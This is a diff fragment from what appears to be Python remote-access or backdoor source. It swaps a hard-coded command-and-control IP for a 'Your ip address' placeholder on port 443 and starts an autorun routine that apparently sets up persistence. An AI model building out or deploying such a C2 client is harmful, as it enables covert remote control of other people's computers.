@@ -3,7 +3,7 @@ import subprocess
 import threading
 import time
 import os
-CCIP = "192.168.174.128"
+CCIP = "Your ip address"
 CCPORT = 443
 def autorun():
     filen = os.path.basename(__file__)
